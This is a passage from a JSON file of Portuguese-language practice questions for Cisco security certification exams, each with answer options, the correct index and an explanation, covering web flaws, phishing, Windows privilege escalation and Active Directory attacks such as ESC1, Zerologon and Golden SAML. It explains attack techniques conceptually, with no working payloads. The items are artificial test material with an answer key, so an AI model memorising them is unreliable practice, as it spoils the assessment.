      "Insecure direct object reference (IDOR), uma falha de controlo de acessos em que o servidor não verifica quem é o dono",
      "Session fixation, porque o atacante definiu o ID de sessão antes do login e pode agora reutilizá-lo para ler dados do cliente"
    ],
    "correct": 2,
    "explanation": "O IDOR (parte do Broken Access Control da OWASP) acontece quando a aplicação confia num ID de objeto vindo do cliente sem verificar se o utilizador autenticado lhe pode aceder. A correção é uma verificação de autorização no servidor para cada objeto (IDs aleatórios não chegam). CSRF forja pedidos a partir do browser da vítima, traversal usa ../ para chegar a ficheiros e session fixation reutiliza um ID de sessão definido antes.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Utilizadores com MFA por notificação push são alvo de phishing através de um reverse proxy que mostra a verdadeira página de login do Microsoft 365. Depois o atacante entra sem qualquer pedido de MFA. O que aconteceu e o que resiste melhor?",
    "options": [
      "Phishing adversary-in-the-middle roubou o cookie de sessão depois do MFA; FIDO2/passkeys ligadas à origem bloqueiam-no",
      "MFA fatigue inundou os utilizadores com pedidos push até um ser aprovado; number matching nos pedidos basta para travar este reverse proxy",
      "SIM swapping passou os números dos utilizadores para o atacante; trocar códigos SMS por notificações push bloqueia o ataque por completo",
      "Password spraying adivinhou passwords comuns; um limite de bloqueio de conta mais alto impede o atacante de reutilizar a sessão"
    ],
    "correct": 0,
    "explanation": "Os kits AiTM (por exemplo Evilginx) fazem relay do login real, a vítima completa o MFA e o proxy captura o cookie de sessão, que o atacante reutiliza. FIDO2/passkeys estão ligadas ao domínio verdadeiro e não assinam para o domínio do proxy; acesso condicional e token binding também ajudam. MFA fatigue precisa de pedidos repetidos, SIM swapping ataca o SMS e spraying só adivinha passwords.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.4"
  },
  {
    "question": "Um funcionário clica num link e aprova uma app chamada 'PDF Viewer' que pede Mail.Read e offline_access no Microsoft 365. Mais tarde o correio continua a ser lido mesmo depois de a password ser reposta. O que é isto?",
    "options": [
      "Credential stuffing, porque o atacante reutilizou uma password vazada de outro site e repor a password não acaba com isso",
      "Roubo de cookies por malware, porque o infostealer copiou cookies do browser que se mantêm válidos após a reposição",
      "Typosquatting, porque o funcionário foi a um domínio parecido e o site falso continua a ler o correio pelo webmail",
      "Illicit consent grant (consent phishing OAuth); a app tem refresh token próprio, por isso há que revogar o consentimento"
    ],
    "correct": 3,
    "explanation": "No consent phishing o atacante não precisa da password: o utilizador concede permissões delegadas a uma app OAuth maliciosa e o offline_access dá-lhe um refresh token que sobrevive à reposição da password. A correção é revogar o consentimento e os tokens da app e limitar o consentimento dos utilizadores a editores verificados ou aprovação de administrador. Credential stuffing e cookies roubados são cortados por uma reposição com revogação de sessões, e typosquatting é só um domínio parecido.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.4"
  },
  {
    "question": "Um formulário de login monta SQL com concatenação de strings a partir do campo username. Que defesa melhor impede SQL injection clássica aqui?",
    "options": [
      "Confiar só num conjunto de assinaturas WAF, porque os WAF modernos reescrevem todas as queries antes de chegarem ao motor da base de dados",
      "Fazer hash SHA-256 do username antes da concatenação, para as aspas injetadas virarem hex e não poderem fechar a string",
      "Passar a coluna só para ID numérico e continuar a concatenar, porque números não transportam metacaracteres SQL",
      "Usar queries parametrizadas (prepared statements) para o input ser ligado como dados e nunca ser interpretado como código SQL"
    ],
    "correct": 3,
    "explanation": "Queries parametrizadas / prepared statements separam a instrução SQL dos valores ligados, por isso o input não altera a estrutura da query. Os WAF ajudam em profundidade mas falham payloads novos; hashear o username mantém a query concatenada; forçar numérico ajuda um campo mas não é correção geral e podem restar técnicas baseadas em erros.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.6"
  },
  {
    "question": "No Windows, o ImagePath de um serviço é C:\\Program Files\\Vendor App\\service.exe sem aspas, e Authenticated Users pode escrever em C:\\Program Files\\Vendor App\\. Como pode um atacante local escalar para a conta do serviço?",
    "options": [
      "Substituir o PATH de todo o sistema para o cmd.exe correr primeiro, porque o Windows procura sempre o PATH antes da pasta do ImagePath",
      "Colocar um executável malicioso mais cedo no caminho sem aspas (p.ex. C:\\Program.exe ou sob Vendor App) que o SCM vai lançar",
      "Ativar SeDebugPrivilege com whoami /priv e fazer dump do LSASS, o que é obrigatório antes de abusar de qualquer ImagePath sem aspas",
      "Limpar a lista DependOnService do serviço para o Windows reinstalar o binário a partir de um UNC controlado pelo atacante no boot"
    ],
    "correct": 1,
    "explanation": "Caminhos de serviço sem aspas e com espaços fazem o Service Control Manager tentar C:\\Program.exe, depois C:\\Program Files\\Vendor.exe, e só depois o caminho real. Permissão de escrita numa pasta anterior permite deixar um binário que o SCM corre com a identidade do serviço (muitas vezes LocalSystem). Hijack do PATH é outro problema; dump LSASS com SeDebug é outra técnica; DependOnService não reinstala assim a partir de UNC.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "3.2"
  },
  {
    "question": "Que afirmação melhor distingue XSS armazenado (stored) de XSS refletido (reflected) numa aplicação web típica?",
    "options": [
      "O XSS stored só funciona em HTTP em claro, enquanto o reflected exige HTTPS e um certificado de cliente válido antes do script correr no browser",
      "O XSS stored guarda o script em dados no servidor para quem vê depois; o reflected só ecoa o payload nessa resposta imediata",
      "O XSS stored só altera registos DNS no resolver, enquanto o reflected reescreve caches ARP no switch de acesso da vítima",
      "O XSS stored precisa de uma extensão de browser maliciosa, enquanto o reflected só precisa de um email sem qualquer link aberto"
    ],
    "correct": 1,
    "explanation": "O XSS stored (persistente) grava o payload num armazenamento da aplicação (comentário, perfil, ticket) para outros utilizadores o receberem e executarem mais tarde. O XSS reflected tira o payload do pedido e reflete-o nessa resposta (muitas vezes via URL maliciosa). HTTP/HTTPS e certificados de cliente não definem a diferença; nenhum dos tipos é sobre envenenar DNS/ARP; extensões não entram na classificação clássica.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.6"
  },
  {
    "question": "Um site bancário autentica POSTs com cookies de sessão. Que defesa melhor impede CSRF clássico numa transferência que altera estado?",
    "options": [
      "Desativar TLS no endpoint de transferência para o browser recusar cookies em POSTs cross-site sem URL HTTPS",
      "Fazer hash MD5 do número de conta no body JSON, porque ferramentas CSRF não forjam esse digest sem material de chave privada do HSM offline do banco",
      "Exigir um token anti-CSRF por sessão (ou cookies SameSite=Strict) para POSTs cross-site forjados não terem o segredo esperado",
      "Abrir CORS com Access-Control-Allow-Origin * para o browser bloquear automaticamente POSTs cross-origin com credenciais"
    ],
    "correct": 2,
    "explanation": "O CSRF clássico aproveita o envio automático de cookies do browser num pedido cross-site forjado. Tokens anti-CSRF (ou cookies SameSite estritos) fazem com que o pedido forjado não tenha um segredo que só a página legítima da app consegue ler. Desativar TLS não impede o envio de cookies; MD5 de um número de conta público não é segredo CSRF; ACAO * não bloqueia CSRF com credenciais e é o oposto de uma política CORS apertada.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Porque é que o UEFI Secure Boot (ou Measured Boot com atestações TPM) continua útil mesmo com o disco totalmente encriptado ao estilo BitLocker (FDE)?",
    "options": [
      "Protege a integridade da cadeia de boot para malware não substituir o bootloader/kernel antes do SO desbloquear o volume encriptado",
      "Substitui por completo a encriptação de disco, porque um bootloader validado já encripta cada ficheiro com a endorsement key do TPM",
      "Impede todo o phishing de contas admin na cloud ao ligar cada sessão HTTPS ao hash da base Secure Boot da plataforma",
      "Elimina a necessidade de patches no SO, pois só componentes de boot assinados pela Microsoft podem ter vulnerabilidades exploráveis"
    ],
    "correct": 0,
    "explanation": "A encriptação total de disco protege a confidencialidade dos dados em repouso, mas um bootloader ou kernel comprometido pode correr antes/durante o desbloqueio e subverter o SO. O Secure Boot verifica assinaturas dos componentes de boot; o Measured Boot/atestação regista hashes no TPM para verificação remota. O FDE não é substituído pelo Secure Boot; o Secure Boot não impede phishing; código de boot assinado continua a precisar de patches e não torna o SO isento de bugs.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.3"
  },
  {
    "question": "O que é que um ataque XML External Entity (XXE) explora principalmente num parser vulnerável?",
    "options": [
      "Inunda o resolver DNS com subdomínios aleatórios gerados por um DGA para queries recursivas esgotarem a memória de cache",
      "Falsifica o MAC da vítima no gateway por defeito para respostas ARP redirecionarem sessões HTTPS para um proxy SSL strip local",
      "Engana o parser para resolver entidades externas, o que pode ler ficheiros locais ou alcançar URLs internas a partir do servidor",
      "Substitui a base de assinaturas do bootloader UEFI para o Secure Boot aceitar um kernel não assinado antes do BitLocker desbloquear"
    ],
    "correct": 2,
    "explanation": "O XXE abusa de parsers XML que processam referências a entidades externas. Um documento manipulado pode fazer o servidor obter recursos file:// ou URLs HTTP internas (impacto por vezes semelhante a SSRF). Não é inundação DNS por DGA, não é spoofing ARP, nem ataque a Secure Boot/bootloader.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Na tradecraft de malware Windows, em que consiste principalmente o process hollowing?",
    "options": [
      "Encriptar só o Master Boot Record com uma nota de ransomware e deixar os ficheiros do utilizador em clusters NTFS em claro",
      "Iniciar um processo legítimo suspenso, desmapear o seu código e injetar código malicioso antes de o retomar",
      "Registar um servidor DHCP rogue que dá DNS do atacante para os browsers resolverem bancos para sites de phishing",
      "Fazer brute-force Kerberos AS-REP a contas sem pré-autenticação para crackar hashes offline sem tickets"
    ],
    "correct": 1,
    "explanation": "O process hollowing cria um processo legítimo em estado suspenso, esvazia (desmapeia) a imagem em memória, injeta código do atacante e retoma a execução para o payload correr sob um nome de processo de confiança. Não é ransomware só do MBR, não é DHCP/DNS rogue, nem AS-REP roasting (fraqueza de pré-autenticação Kerberos).",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "2.8"
  },
  {
    "question": "Para que serve principalmente o Microsoft Sysmon em endpoints Windows num desenho de monitorização blue team?",
    "options": [
      "Substitui a proteção em tempo real do Windows Defender ao assinar cada executável com um certificado de code-signing local autoassinado",
      "É uma função de encriptação total de disco que guarda chaves de recuperação BitLocker só no TPM e nunca no Active Directory",
      "É um cliente VPN que força todo o tráfego corporativo por túneis WireGuard antes de qualquer processo abrir um socket",
      "Fornece logs detalhados de processos, rede e criação de ficheiros que pipelines SIEM/EDR podem usar para deteção"
    ],
    "correct": 3,
    "explanation": "O Sysmon (System Monitor) é um serviço/driver Windows que regista telemetria rica—criação de processos, ligações de rede, alterações a ficheiros/registo, etc.—no event log do Windows para SIEM ou detection engineering. Não substitui o Defender AV, não é BitLocker, nem um cliente VPN.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "O que tenta principalmente um bypass típico de WAF contra um web application firewall?",
    "options": [
      "Inunda o resolver DNS recursivo com subdomínios aleatórios gerados por DGA até esgotar a memória de cache em cada nó do resolver",
      "Manipula pedidos (encoding, caminhos alternativos, truques de verbo) para o payload malicioso chegar à app sem bater nas regras do WAF",
      "Falsifica o MAC do gateway por defeito para respostas ARP forjadas redirecionarem sessões HTTPS para um proxy SSL-strip local na LAN",
      "Substitui a base de assinaturas do UEFI Secure Boot para o firmware aceitar um bootloader não assinado antes de o BitLocker desbloquear"
    ],
    "correct": 1,
    "explanation": "Bypasses de WAF exploram falhas entre o que o WAF normaliza/corresponde e o que a app de backend aceita—encodings, confusão de paths, truques de verbo/content-type HTTP, etc. Não é inundação DNS por DGA, spoofing ARP, nem ataque a Secure Boot.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "2.1"
  },
  {
    "question": "Na tradecraft Windows, em que consiste principalmente o DLL sideloading?",
    "options": [
      "Encriptar só o Master Boot Record com uma nota de ransomware e deixar todos os ficheiros do utilizador em clusters NTFS totalmente em claro",
      "Registar um servidor DHCP rogue que entrega DNS controlado pelo atacante para os browsers resolverem bancos para páginas de phishing falsas",
      "Colocar uma DLL maliciosa onde uma app assinada de confiança a carrega pela ordem de procura, correndo código do atacante nesse processo",
      "Fazer brute-force Kerberos AS-REP a contas sem pré-autenticação para conseguir crackar hashes offline sem obter quaisquer tickets Kerberos"
    ],
    "correct": 2,
    "explanation": "O DLL sideloading abusa de como as apps Windows resolvem caminhos de DLL: o atacante coloca uma DLL maliciosa que um binário legítimo assinado carrega, muitas vezes para se misturar em processos de confiança e contornar allow-lists simples. Não é ransomware só do MBR, DHCP/DNS rogue, nem AS-REP roasting.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "2.8"
  },
  {
    "question": "No Active Directory, porque é a delegação Kerberos unconstrained especialmente perigosa se um atacante comprometer esse host?",
    "options": [
      "O host pode reutilizar tickets de utilizadores que se autenticam nele para os impersonar perante outros serviços no domínio",
      "Desativa completamente o Kerberos e força todos os logons interativos a usar binds LDAP simple em claro só na porta TCP 389",
      "Converte automaticamente todas as contas de serviço em Domain Admins após o próximo intervalo de atualização de GPO terminar",
      "Guarda chaves de recuperação BitLocker no SYSVOL em claro para qualquer Authenticated User as ler a partir do share"
    ],
    "correct": 0,
    "explanation": "Com delegação unconstrained, um computador/serviço recebe e pode reencaminhar TGTs de utilizadores que se ligam a ele, permitindo impersonação noutros serviços se o host for comprometido. Não desativa Kerberos para binds LDAP, não promove contas de serviço a Domain Admin, nem põe chaves BitLocker no SYSVOL.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "O que exploram principalmente as vulnerabilidades da família PrintNightmare num ambiente Windows?",
    "options": [
      "Forjam communities BGP nos routers de edge para cada subnet de impressoras ir para Null0 antes de o serviço de spooler arrancar no boot",
      "Substituem as chaves do UEFI Secure Boot para só firmware de impressora não assinado carregar antes de o BitLocker desbloquear o volume",
      "Abusam do Windows Print Spooler para um atacante remoto ou local executar código como SYSTEM, muitas vezes via drivers maliciosos",
      "Convertem cada Domain Controller num print server que guarda o NTDS.dit dentro da pasta partilhada printers$ para leitura SMB anónima"
    ],
    "correct": 2,
    "explanation": "Problemas estilo PrintNightmare abusam do Print Spooler (e caminhos de instalação de drivers) para obter execução remota/local como SYSTEM. Mitigações: desativar o spooler onde não for preciso, restringir instalação de drivers e aplicar patches. Não é truque BGP Null0, troca de chaves Secure Boot, nem partilha anónima do NTDS.dit.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "2.8"
  },
  {
    "question": "No abuso de Active Directory Certificate Services (AD CS), em que se baseia principalmente a técnica ESC1?",
    "options": [
      "Roubar só o hash KRBTGT de um backup em fita de Domain Controller só de leitura para forjar Silver Tickets sem usar certificados de todo",
      "Um template de certificado mal configurado que deixa utilizadores pouco privilegiados fazer enroll com SAN arbitrário e autenticar como outro",
      "Forçar todas as workstations a confiar numa opção DHCP 252 WPAD rogue para proxies interceptarem Kerberos AS-REQ só na porta UDP 88",
      "Desativar a assinatura SMB em todo o domínio com uma única GPO para o relay NTLM para LDAP ficar o único pré-requisito que ainda se chama ESC1"
    ],
    "correct": 1,
    "explanation": "O ESC1 abusa de templates AD CS demasiado permissivos (ex.: EKU de autenticação de cliente, SAN indicado pelo enrollee, enrollment para Domain Users) para o atacante obter um certificado que impersona outro principal e depois o usa para autenticar. Não é roubo só do KRBTGT para Silver Ticket, interceptação Kerberos via WPAD/DHCP 252, nem GPO de SMB signing como núcleo do ESC1.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "cripto",
    "domain": "1.5"
  },
  {
    "question": "Em que difere principalmente o RASP (Runtime Application Self-Protection) de um WAF tradicional de rede ou reverse-proxy?",
    "options": [
      "O RASP só inspeciona regras BGP flowspec no appliance de firewall de edge, enquanto um WAF só valida LSAs OSPF antes de entrarem na Area 0 do core",
      "O RASP substitui por completo o TLS por HTTP em claro dentro do contentor da app para o WAF saltar para sempre o certificate pinning após cada deploy",
      "O RASP corre apenas como sandbox offline de malware que detona binários carregados uma vez, enquanto um WAF fica inline em cada pacote do caminho",
      "O RASP instrumenta a aplicação em execução para ver o contexto real de código; um WAF tipicamente filtra HTTP no edge sem ver o interior da app"
    ],
    "correct": 3,
    "explanation": "O RASP faz hook/instrumentação no runtime da aplicação (bibliotecas, interpretadores, agentes) para as deteções usarem caminhos de código, fluxos de dados e utilizadores reais—contexto que um WAF de perímetro normalmente não tem. Um WAF continua a filtrar na camada HTTP/política de edge. RASP não é inspeção BGP/OSPF, não remove TLS, nem é só uma sandbox offline.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "3.6"
  },
  {
    "question": "Para que se usa principalmente o BloodHound em avaliações de segurança de Active Directory?",
    "options": [
      "Substitui a password KRBTGT de cada Domain Controller duas vezes por hora para Golden Tickets expirarem antes de forjar qualquer TGT",
      "Atua como WAF inline que bloqueia pedidos TGS de Kerberoasting quando um SPN pertence a conta de utilizador com hash fraco",
      "Cifra a memória do LSASS com um enclave de hipervisor para ferramentas como Mimikatz nunca lerem hashes NTLM ou tickets Kerberos da RAM",
      "Mapeia utilizadores, grupos, computadores e ACLs do AD num grafo para revelar caminhos de ataque, por exemplo até Domain Admin"
    ],
    "correct": 3,
    "explanation": "O BloodHound (e collectors como SharpHound) enumeram relações e ACLs do AD num grafo para analistas/atacantes encontrarem caminhos de escalonamento de privilégios (ex.: até Domain Admin). Não roda o KRBTGT periodicamente, não é um WAF anti-Kerberoasting, nem cifra o LSASS por si.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "No abuso moderno de Active Directory, em que consistem principalmente as Shadow Credentials?",
    "options": [
      "Escrever um SPN malicioso no krbtgt para forçar cada pedido TGS a unconstrained delegation para um host rogue controlado pelo atacante",
      "Escrever chaves controladas pelo atacante em msDS-KeyCredentialLink da conta para autenticar como esse principal via PKINIT",
      "Desativar assinatura SMB e LDAP channel binding em todo o domínio com uma GPO para o relay NTLM a AD CS ficar o único passo em falta",
      "Substituir registos DANE TLSA do domínio para clientes LDAPS aceitarem uma cadeia forjada de qualquer intermédia da Web PKI pública"
    ],
    "correct": 1,
    "explanation": "Shadow Credentials abusam do atributo msDS-KeyCredentialLink (muitas vezes no modelo Key Trust / Windows Hello for Business) para quem puder escrever esse atributo adicionar o seu material de chave e obter tickets da vítima via PKINIT. Não é SPN no krbtgt para unconstrained delegation, nem só uma GPO a desligar signing/binding, nem troca de DANE TLSA.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.5"
  },
  {
    "question": "Num dispositivo Windows joined ao Microsoft Entra ID, para que serve principalmente um Primary Refresh Token (PRT)?",
    "options": [
      "É uma password de recuperação BitLocker de uso único só em escrow no Active Directory para discos offline nunca abrirem sem um Domain Admin",
      "É um hash SAM local da password do utilizador enrolled que o Windows reutiliza em serviços NTLM quando o Kerberos não está disponível na subnet",
      "É um refresh token de SSO ligado ao dispositivo que permite obter em silêncio access tokens para apps e recursos cloud protegidos pelo Entra ID",
      "É uma shared access signature do Azure Storage que dá escrita anónima a todos os contentores blob do tenant até à próxima mudança de password do user"
    ],
    "correct": 2,
    "explanation": "Um PRT é emitido a dispositivos Entra-joined/hybrid-joined e permite SSO: o dispositivo obtém access tokens para recursos cloud sem pedir credenciais repetidamente. O roubo/abuso do PRT é um risco estilo living-off-cloud. Não é escrow BitLocker, nem hash SAM/NTLM para replay, nem um SAS anónimo de todo o tenant.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "Em ambientes cloud, porque é especialmente perigoso um SSRF que alcança o instance metadata service (IMDS, ex. 169.254.169.254)?",
    "options": [
      "Só permite mudar o hostname da VM no DNS para o certificate pinning TLS falhar no próximo reboot de cada load balancer",
      "Desativa permanentemente a firewall do hipervisor para cada guest enviar updates BGP spoofed para o backbone do provider sem IAM",
      "Pode expor credenciais ou tokens temporários da instance role, permitindo ao atacante chamar APIs cloud com essa role",
      "Força o SO guest a descer todo o TLS de saída para SSLv3 para captures no VPC mirror desencriptarem cada sessão HTTPS"
    ],
    "correct": 2,
    "explanation": "O IMDS muitas vezes entrega credenciais IAM (ou tokens de curta duração) à instância. Um SSRF que consulte esse endpoint link-local pode roubar essas credenciais e abusar das APIs cloud. Não é só um truque de hostname/DNS, nem um enabler de BGP spoof, nem um downgrade SSLv3 de todo o TLS de saída.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.1"
  },
  {
    "question": "Em que consiste principalmente um ataque de phishing com OAuth device code?",
    "options": [
      "Levar a vítima a conceder consentimento à app registada pelo atacante ao introduzir um user code curto mostrado numa página falsa ou controlada pelo atacante",
      "Instalar uma extensão de browser maliciosa que reescreve cada Authorization header para um Bearer token estático roubado do LSASS",
      "Desativar MFA em todo o tenant com uma asserção SAML forjada que o IdP aceita porque o device code ignora por completo o TLS",
      "Substituir o endpoint JWKS do tenant por uma chave rogue para cada refresh token já emitido validar para sempre sem expiração"
    ],
    "correct": 1,
    "explanation": "O fluxo device authorization mostra um user code e um URI de verificação. Os atacantes levam a vítima a aprovar a app do atacante (muitas vezes numa página convincente), obtendo tokens. Não é reescrita Bearer via LSASS, nem forge SAML que desliga MFA e TLS, nem troca permanente do JWKS.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.4"
  },
  {
    "question": "No Windows, o que consegue principalmente um atacante local ao abusar de SeImpersonatePrivilege (ex. técnicas da família Potato)?",
    "options": [
      "Reescreve o hash KRBTGT do domínio no AD para cada TGT forjado depois ser aceite como Golden Ticket sem qualquer direito DCSync no domínio",
      "Desativa o Tamper Protection do Windows Defender trocando a base de assinaturas do driver ELAM por uma cópia offline sem assinatura válida",
      "Força cada ligação SMB de saída a cair para NTLMv1 para um listener remoto capturar pares challenge-response facilmente crackáveis",
      "Permite a uma conta de serviço (ou similar) impersonar um token mais privilegiado no host, muitas vezes escalando a SYSTEM"
    ],
    "correct": 3,
    "explanation": "SeImpersonatePrivilege deixa um processo impersonar clientes que se ligam a ele. Ataques estilo Potato forçam um serviço privilegiado a autenticar-se no pipe/listener do atacante e depois impersonam esse token de alto privilégio (muitas vezes SYSTEM). Não é reescrita do KRBTGT, bypass do Tamper Protection/ELAM por si, nem downgrade forçado de todo o SMB para NTLMv1.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "3.2"
  },
  {
    "question": "O que força principalmente um ataque estilo PetitPotam um host Windows (muitas vezes um DC) a fazer?",
    "options": [
      "Reescrever no disco o hash KRBTGT do domínio para cada TGT forjado validar depois sem precisar de quaisquer direitos DCSync",
      "Desativar o Credential Guard substituindo a política de arranque VBS por um hive de registo offline sem assinatura copiado de outro host",
      "Forçar cada sessão SMB de saída a cair para NTLMv1 para um listener remoto capturar e crackar pares challenge-response offline",
      "Autenticar-se num listener controlado pelo atacante (muitas vezes via MS-EFSRPC), permitindo NTLM relay ou abuso relacionado"
    ],
    "correct": 3,
    "explanation": "O PetitPotam abusa do MS-EFSRPC (e similares) para forçar autenticação para o atacante. Combinado com NTLM relay (ou técnicas relacionadas), pode levar a compromisso adicional do domínio. Não é por si uma reescrita do KRBTGT, bypass do Credential Guard por hive, nem downgrade forçado de todo o SMB para NTLMv1.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.5"
  },
  {
    "question": "O que permitia principalmente a vulnerabilidade Zerologon (CVE-2020-1472) a um atacante na rede contra um domain controller sem patch?",
    "options": [
      "Ler todas as chaves de recuperação BitLocker do Azure AD forjando só o canal seguro Netlogon com uma tag de autenticação AES-GCM vazia",
      "Desativar remotamente o Tamper Protection do Windows Defender ao definir a password da conta máquina Netlogon literalmente como a string zerologon",
      "Forjar a autenticação do canal seguro Netlogon (falha do IV a zeros) e repor a password da conta máquina do DC para um valor vazio ou conhecido",
      "Forjar Golden Tickets Kerberos sem nunca tocar no KRBTGT, porque o Netlogon substituiu a validação PAC em cada TGS-REQ seguinte"
    ],
    "correct": 2,
    "explanation": "O Zerologon abusava de uma falha criptográfica do Netlogon (IV a zeros) para um atacante se fazer passar por cliente e definir a password da conta máquina do DC para um valor conhecido/vazio, abrindo caminho a takeover. Não é roubo de chaves BitLocker só com tags GCM vazias, nem um interruptor do Tamper Protection, nem Golden Tickets sem KRBTGT.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "O que protege principalmente o Windows Credential Guard num host suportado?",
    "options": [
      "Toda a forja de Golden Tickets Kerberos em todo o domínio, porque cada DC recusa qualquer TGT que não tenha sido selado dentro de um enclave VBS",
      "O roubo de credenciais derivadas como hashes NTLM ou tickets Kerberos a partir do LSASS, isolando esses segredos com VBS",
      "Todo o ataque NTLM relay na LAN, porque o Credential Guard desativa por completo o NetNTLM em todas as ligações SMB de saída",
      "Ransomware a encriptar volumes NTFS locais, porque o VBS remapeia clusters de disco para um volume scratch só em RAM encriptado no arranque"
    ],
    "correct": 1,
    "explanation": "O Credential Guard usa segurança baseada em virtualização para isolar segredos, impedindo malware com direitos de admin de os extrair simplesmente do LSASS. Não impede sozinho Golden Tickets no domínio, não desliga todo o NetNTLM/relay, nem serve de anti-ransomware por encriptação de disco.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.1"
  },
  {
    "question": "O que abusa principalmente um ataque DCShadow na replicação do Active Directory?",
    "options": [
      "Inunda cada controlador de domínio com TGTs Kerberos forjados para os direitos DCSync legítimos deixarem de ser necessários para ler hashes de passwords",
      "Substitui o hash da password KRBTGT em disco com uma edição offline local e espera que a replicação normal propague Golden Tickets em todo o domínio",
      "Coage uma estação a autenticar via MS-EFSRPC para o atacante fazer relay NTLM para LDAP e emitir um certificado rogue como esse computador",
      "Regista um controlador de domínio rogue para os atacantes empurrarem alterações maliciosas a objetos pelos canais normais de replicação AD"
    ],
    "correct": 3,
    "explanation": "O DCShadow faz uma máquina comportar-se como DC e injeta alterações controladas pelo atacante na replicação AD. Não é coerção PetitPotam, edição offline do KRBTGT nem inundação de TGTs forjados.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Porque adicionam por vezes os atacantes uma ACE de backdoor no objeto AdminSDHolder do Active Directory?",
    "options": [
      "Porque o AdminSDHolder guarda o hash KRBTGT em claro no disco, e qualquer ACE aí concede logo DCSync sem precisar de mais passos de replicação no domínio",
      "Porque cada nova conta de computador herda as ACL do AdminSDHolder ao juntar-se ao domínio, transformando uma ACE em admin local em todas as estações",
      "Porque o SDProp copia periodicamente a ACL do AdminSDHolder para grupos privilegiados protegidos, e uma ACE plantada pode voltar após limpeza desses grupos",
      "Porque o AdminSDHolder desativa a pré-autenticação Kerberos de todos os Domain Admins, permitindo AS-REP roasting contra todas as contas privilegiadas de uma vez"
    ],
    "correct": 2,
    "explanation": "O SDProp (Security Descriptor Propagator) reaplica periodicamente a ACL do AdminSDHolder a grupos protegidos (ex. Domain Admins). Uma ACE de backdoor aí pode restaurar direitos do atacante após limpeza. Não guarda KRBTGT em claro, não dá admin local nas estações nem desativa a pré-autenticação.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Como difere o overpass-the-hash (pass-the-key) do pass-the-hash clássico contra o Active Directory?",
    "options": [
      "Extrai só hashes LM da base SAM local e nunca toca no Kerberos, funcionando apenas em hosts que ainda aceitam NTLMv1 em partilhas SMB da rede",
      "Usa um NT hash ou chave AES roubado para pedir um TGT Kerberos real e depois autentica com tickets em vez de apresentar hashes NTLM em cada salto",
      "Reescreve a chave KRBTGT do domínio em cada controlador de domínio para os Golden Tickets existentes ficarem as únicas credenciais válidas na floresta",
      "Desativa a assinatura SMB em toda a floresta com uma GPO maliciosa via SYSVOL, forçando cada desafio NTLM a aceitar respostas vazias dos atacantes"
    ],
    "correct": 1,
    "explanation": "O overpass-the-hash / pass-the-key transforma uma chave/hash roubada num TGT Kerberos (ex. via mimikatz), e o acesso seguinte usa tickets em vez de PtH NTLM bruto em cada recurso. Não é só LM, não reescreve o KRBTGT nem desativa assinatura SMB por GPO.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Num ataque Golden SAML contra um ambiente federado como o AD FS, o que é que o atacante rouba e abusa principalmente?",
    "options": [
      "O hash da conta KRBTGT, que lhe permite assinar tickets Kerberos aceites diretamente por apps cloud sem nenhum servidor de federação pelo meio do caminho",
      "A chave privada do certificado de assinatura de tokens, que lhe permite forjar asserções SAML para qualquer utilizador aceites pelos serviços cloud",
      "A base de dados do servidor DHCP, que lhe permite distribuir um endereço de identity provider falso para cada browser entrar num portal falso",
      "As credenciais do relay SMTP, que lhe permitem enviar emails de reposição de password que contornam o MFA em todos os serviços federados"
    ],
    "correct": 1,
    "explanation": "Golden SAML é roubar a chave de assinatura de tokens do servidor de federação e forjar asserções SAML assinadas para qualquer utilizador, contornando muitas vezes o MFA no service provider. Não é abuso do KRBTGT, spoofing DHCP nem relay SMTP.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.5"
  },
  {
    "question": "Um atacante pode escrever no atributo msDS-AllowedToActOnBehalfOfOtherIdentity de um objeto de computador alvo e controla uma conta de máquina. O que lhe permite o abuso de resource-based constrained delegation?",
    "options": [
